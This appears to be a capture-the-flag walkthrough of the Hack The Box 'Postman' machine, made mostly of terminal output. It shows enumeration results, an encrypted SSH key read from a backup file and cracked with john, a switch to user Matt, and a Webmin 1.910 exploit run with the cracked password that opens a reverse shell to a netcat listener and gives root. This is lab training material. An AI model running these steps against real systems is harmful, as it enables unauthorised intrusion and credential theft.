root         78  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kthrotld]
root         79  0.0  0.0      0     0 ?        I<   Dec09   0:00 [acpi_thermal_pm]
root         80  0.0  0.0      0     0 ?        S    Dec09   0:00 [scsi_eh_0]
root         81  0.0  0.0      0     0 ?        I<   Dec09   0:00 [scsi_tmf_0]
root         82  0.0  0.0      0     0 ?        S    Dec09   0:00 [scsi_eh_1]
root         83  0.0  0.0      0     0 ?        I<   Dec09   0:00 [scsi_tmf_1]
root         86  0.0  0.0      0     0 ?        I    Dec09   0:00 [kworker/0:2]
root         90  0.0  0.0      0     0 ?        I<   Dec09   0:00 [ipv6_addrconf]
root         99  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kstrp]
root        116  0.0  0.0      0     0 ?        I<   Dec09   0:00 [charger_manager]
root        168  0.0  0.0      0     0 ?        I<   Dec09   0:00 [mpt_poll_0]
root        169  0.0  0.0      0     0 ?        I<   Dec09   0:00 [mpt/0]
root        170  0.0  0.0      0     0 ?        S    Dec09   0:00 [scsi_eh_2]
root        171  0.0  0.0      0     0 ?        I<   Dec09   0:00 [scsi_tmf_2]
root        173  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kworker/0:1H]
root        193  0.0  0.0      0     0 ?        S    Dec09   0:00 [jbd2/sda1-8]
root        194  0.0  0.0      0     0 ?        I<   Dec09   0:00 [ext4-rsv-conver]
root        220  0.0  1.6  94824 15176 ?        S<s  Dec09   0:00 /lib/systemd/systemd-journald
root        249  0.0  0.5  45732  4644 ?        Ss   Dec09   0:00 /lib/systemd/systemd-udevd
systemd+    321  0.0  0.3 141928  3300 ?        Ssl  Dec09   0:00 /lib/systemd/systemd-timesyncd
systemd+    322  0.0  0.5  70628  5452 ?        Ss   Dec09   0:00 /lib/systemd/systemd-resolved
root        328  0.0  1.1  91152 10972 ?        Ss   Dec09   0:00 /usr/bin/VGAuthService
root        330  0.0  0.8 153288  7560 ?        S<sl Dec09   0:10 /usr/bin/vmtoolsd
root        336  0.0  0.6  70608  6040 ?        Ss   Dec09   0:00 /lib/systemd/systemd-logind
root        343  0.0  0.3  31320  3304 ?        Ss   Dec09   0:00 /usr/sbin/cron -f
syslog      344  0.0  0.4 263036  4564 ?        Ssl  Dec09   0:00 /usr/sbin/rsyslogd -n
root        347  0.0  1.8 170344 17168 ?        Ssl  Dec09   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
message+    348  0.0  0.4  50100  4452 ?        Ss   Dec09   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root        356  0.0  0.7 289844  7212 ?        Ssl  Dec09   0:00 /usr/lib/accountsservice/accounts-daemon
root        439  0.0  0.0      0     0 ?        I<   Dec09   0:00 [ttm_swap]
root        440  0.0  0.0      0     0 ?        S    Dec09   0:00 [irq/16-vmwgfx]
root        608  0.0  0.6  72296  6408 ?        Ss   Dec09   0:00 /usr/sbin/sshd -D
redis       623  0.1  0.4  51576  4300 ?        Ssl  Dec09   0:13 /usr/bin/redis-server 0.0.0.0:6379
root        630  0.0  0.2  16180  1992 tty1     Ss+  Dec09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        637  0.0  1.7 331332 16504 ?        Ss   Dec09   0:00 /usr/sbin/apache2 -k start
www-data    640  0.0  1.1 335792 10124 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
www-data    641  0.0  1.1 335800 10112 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
www-data    644  0.0  0.9 335792  9036 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
www-data    645  0.0  1.1 335800 10128 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
www-data    646  0.0  1.1 335800 10128 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
root        722  0.0  3.2  95296 29516 ?        Ss   Dec09   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
www-data    822  0.0  1.1 335792 10112 ?        S    Dec09   0:00 /usr/sbin/apache2 -k start
root        970  0.0  0.7 107988  7200 ?        Ss   Dec09   0:00 sshd: redis [priv]
redis       972  0.0  0.7  76644  7060 ?        Ss   Dec09   0:00 /lib/systemd/systemd --user
redis       973  0.0  0.2 193408  2232 ?        S    Dec09   0:00 (sd-pam)
redis      1021  0.0  0.4 108096  4296 ?        S    Dec09   0:00 sshd: redis@pts/0
redis      1024  0.0  0.5  22488  5092 pts/0    Ss   Dec09   0:00 -bash
root      16134  0.0  0.0      0     0 ?        I    00:09   0:00 [kworker/u256:2]
root      16245  0.0  0.0      0     0 ?        I    01:09   0:00 [kworker/u256:1]
redis     30654  0.0  0.4  13672  4192 pts/0    S+   01:34   0:00 /bin/bash ./LinEnum.sh
redis     30655  0.0  0.3  13804  3040 pts/0    S+   01:34   0:00 /bin/bash ./LinEnum.sh
redis     30656  0.0  0.0   7476   744 pts/0    S+   01:34   0:00 tee -a
root      30707  0.0  0.0      0     0 ?        I    01:34   0:00 [kworker/u256:0]
redis     30858  0.0  0.3  13804  2796 pts/0    S+   01:34   0:00 /bin/bash ./LinEnum.sh
redis     30859  0.0  0.4  39664  3700 pts/0    R+   01:34   0:00 ps aux


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2


[-] Apache version:
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2019-07-16T18:14:45


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 actions_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 rewrite_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                   4:7.4.0-1ubuntu2.3                amd64        GNU C++ compiler
ii  g++-7                                 7.4.0-1ubuntu1~18.04.1            amd64        GNU C++ compiler
ii  gcc                                   4:7.4.0-1ubuntu2.3                amd64        GNU C compiler
ii  gcc-7                                 7.4.0-1ubuntu1~18.04.1            amd64        GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1382 Aug 25  2019 /etc/passwd
-rw-r--r-- 1 root root 709 Oct 25  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
-rw-r----- 1 root shadow 935 Aug 26  2019 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount


[-] SGID files:
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 30800 Oct 15  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage


[+] Files with POSIX capabilities set:
/usr/bin/mtr-packet = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
-rw-r--r-- 1 root root 144 Aug 24  2019 /etc/kernel-img.conf
-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
-rw-r--r-- 1 root root 350 Aug 24  2019 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 5898 Aug 24  2019 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
-rw-r--r-- 1 root root 513 Aug 24  2019 /etc/nsswitch.conf
-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 3028 Aug 24  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf


[-] Current user's history files:
-rw------- 1 redis redis 399 Oct 25  2019 /var/lib/redis/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/Matt/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-rw------- 1 root root 695 Aug 25  2019 /var/backups/group.bak
-rw------- 1 root shadow 577 Aug 25  2019 /var/backups/gshadow.bak
-rw------- 1 root shadow 935 Aug 26  2019 /var/backups/shadow.bak
-rw------- 1 root root 1382 Aug 25  2019 /var/backups/passwd.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug 24  2019 .
drwxr-xr-x 13 root root 4096 Aug 25  2019 ..


### SCAN COMPLETE ####################################

REVIEW THE BACKUP ID_RSA FILE
[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak

FIND ENCRYPTED RSA SSH KEY FOR USER MATT
redis@Postman:~$ ls -ltra /opt/
total 12
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Sep 30 16:14 ..
redis@Postman:~$ cat /opt/id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

TRANSFER KEY OVER TO KALI TO CRACK
redis@Postman:~$ cd /opt/
redis@Postman:/opt$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

root@kali:~/htb/postman/Redis-Server-Exploit# wget 10.10.10.160:8000/id_rsa.bak

TRANSFORM KEY INTO A HASH FOR CRACKING
root@kali:~/htb/postman/Redis-Server-Exploit# ssh2john id_rsa.bak > matt_rsa.hash
root@kali:~/htb/postman/Redis-Server-Exploit# cat matt_rsa.hash 
id_rsa.bak:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204445532d454445332d4342432c373345394345464243434635323837430a0a4a65684135314931377273434f4f56717957782b4338333633494f4259585131314464772f7072334c3241324e44744237747673584e79714b44676866516e580a6377474a4a5544396b4b4a6e694a6b4a7a72764631576570764d4e6b6a395a497458517a594e3877626a6c726b7531624a7135786e4a58394555623549376b320a3747735477734d764b7a586b6b66455a5161584b2f5435307333493443646366627231645849796162584c4c705a4f695a454b7672342b4b79536a70346f75360a63646e4357687a6b412f54774a7058473157654f6d4d7674435a5731484342757459734e503642446637386251476d6d6c697271526d58664c4239324a6854390a3175384a7a48434a317a5a4d473576615574766f6e307167507837786549554f364c4146546f7a724e394d4757457142454a357a4d56727274335447566b63760a4579766c57776b7337522f676a7848795577542b61354c434747536a564438354c785975746757784f554b62745747426255387969375973586c4b43777748500a5548374f66517a30335657792b4b3061613851732b4579773658337762576e756530336e672f734c4a6e4a3732397a62336b75796d38722b68552b39763656590a536a2b516e6a5654596a44666e5432326a4a42554854563279724b65417a3643586446542b7849687845416976306d315a6b6b79516b57705569437a7975594b0a742b4d5374775774537430564a3455314e613247337847506a6d726b6d6a77587675644b4330594e2f4f426f50504f546142564439693666736f5a3670776e530a354d6938427a724268644f30774861446354595063334230304377714156354d586d6b416b327a4b4c305732746456596b734b77784b4377476d576c70646b650a50324a476c70394c574565724d666f6c626a54534f55356d446550664d51336677434f364d504269717a72724663504e4a72372f4d63514543623573662b4f360a6a4b45334a666e3055564532515664564b336f454c3644796142662f5732642f3354377131305564374b2b344b64333667784d426633334561362b71783347650a53624a49686b737735544b68643530354169554832546e3839714e476563564a45626a4b654a2f76465a4335594973512b39736c3839546d4a484c37345933690a6c335958444573516a685a48785835582f52553032442b4146303770334253526a68443330636a6a307575576b4b6f77706f6f30593065626c676d64376f32580a3056495772736b504b34493749483567626b72785647622f39672f573275613143334e6e6376334d4e6366306e6c4931313742532f51774e7475546f7a4738700a53396b336c692b7259723666336d612f554c73556e4b695a6c73385370552b5273616f734c474b5a3670326f4965386f52536d6c4f43735930494371376552520a686b757a557548397a2f6d426f3274515768387176546f4353456a6738794e4f397a382b4c646f4e317751574d5061567752426a49797843504846544a33752b0a5a787930744950776a435a76785566596e2f4b34465648617676412b62396c6f706e55434541455270774976382b74596f66774756704c56433044724e3538560a58546642325839734c316f4233684f346d4a46305a33794a324b5a45645977484775714e544661674e30674263794e49327773785a4e7a494b32367650724f440a623642633955646957435a714d4b557834614d544c684735524f6a675147797457662f71374d47724f33634632356b315045574e795a4d7159345759735a58690a57685146486b464f494e7756454f7448616b5a2f546f596155514e74525436705a794867766a54306d546f3074336a5545527370706a31707762676743476d680a4b546b6d684b2b4d54616f7938394367305877324a3138446d306f37387036554e726b537565314373576a4566454946334e414d4555326f2b4e67713932486d0a6e7041465265747677513778756b6b30726262366d7646386753714c5167375770625a467974675330355470505a504d306838745245385952644a68655772510a56634e795a48384f4859714553346732554636324b7074747153774c69694634757448712b2f683543517773462b4a52673838626e7868327a324244366935570a582b684b354850707036516e6a5a384135455275554547615a42455576474a745047486a5a794c706b79744d68546a614f72524e59773d3d0a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1743*0

CRACK THE HASH WITH JOHN
root@kali:~/htb/postman# john matt_rsa.hash --wordlist /usr/share/wordlists/rockyou.txt 
computer2008     (id_rsa.bak)

root@kali:~/htb/postman# john matt_rsa.hash --show
id_rsa.bak:computer2008

SWITCH TO USER MATT
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/opt$ sudo -l
[sudo] password for Matt: 
Sorry, user Matt may not run sudo on Postman.

GET USER FLAG
Matt@Postman:/opt$ cd /home/Matt/
Matt@Postman:~$ cat user.txt 
###########################################

PRIVESC AS USER MATT

REVIEW WEBMIN PORTAL AS SERVICE RUNNING AS ROOT
Matt@Postman:~$ ps aux | grep webmin
root        722  0.0  3.2  95296 29516 ?        Ss   Dec09   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
Matt      31198  0.0  0.1  14428  1004 pts/0    S+   01:50   0:00 grep --color=auto webmin

LOGIN WITH MATTS CREDENTIALS
https://10.10.10.160:10000/session_login.cgi

REVIEW EXPLOIT SCRIPTS FOR WEBMIN REMOTE EXECUTION
https://github.com/roughiz/Webmin-1.910-Exploit-Script

root@kali:~/htb/postman# searchsploit webmin 1.9
Exploits: No Result
Shellcodes: No Result
root@kali:~/htb/postman# git clone https://github.com/roughiz/Webmin-1.910-Exploit-Script.git
root@kali:~/htb/postman# cd Webmin-1.910-Exploit-Script/
root@kali:~/htb/postman/Webmin-1.910-Exploit-Script# chmod 744 webmin_exploit.py 

RUN WEBMIN EXPLOIT
root@kali:~/htb/postman/Webmin-1.910-Exploit-Script# python webmin_exploit.py --rhost 10.10.10.160 --rport 10000 --lhost 10.10.14.26 --lport 1234 -u Matt -p computer2008 -s True
****************************** Webmin 1.910 Exploit By roughiz*******************************
*********************************************************************************************
*********************************************************************************************
*********************************************************************************************
****************************** Retrieve Cookies sid *****************************************


********** [+] [Exploit] The Cookie is 003bedf155ce043c35e372ad79073832

********************************************************************************************
****************************** Create payload and Exploit ***********************************




********** [+] [Exploit] Verify you nc listener on port 1234 for the incomming reverse shell
root@kali:~/htb/postman/Webmin-1.910-Exploit-Script# python webmin_exploit.py --rhost 10.10.10.160 --rport 10000 --lhost 10.10.14.26 --lport 1234 -u Matt -p computer2008 -s True
****************************** Webmin 1.910 Exploit By roughiz*******************************
*********************************************************************************************
*********************************************************************************************
*********************************************************************************************
****************************** Retrieve Cookies sid *****************************************


********** [+] [Exploit] The Cookie is 2d117ef9bd038b443fee0007409d7ffd

********************************************************************************************
****************************** Create payload and Exploit ***********************************




********** [+] [Exploit] Verify you nc listener on port 1234 for the incomming reverse shell

START REVERSE LISTENER
root@kali:~/htb/postman# nc -lvp 1234
listening on [any] 1234 ...

GET ROOT SHELL
root@kali:~/htb/postman# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.160: inverse host lookup failed: Unknown host
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.160] 58716
id
uid=0(root) gid=0(root) groups=0(root)
hostname
Postman
uname -ar
Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

GET ROOT FLAG
cat /root/root.txt
#####################################

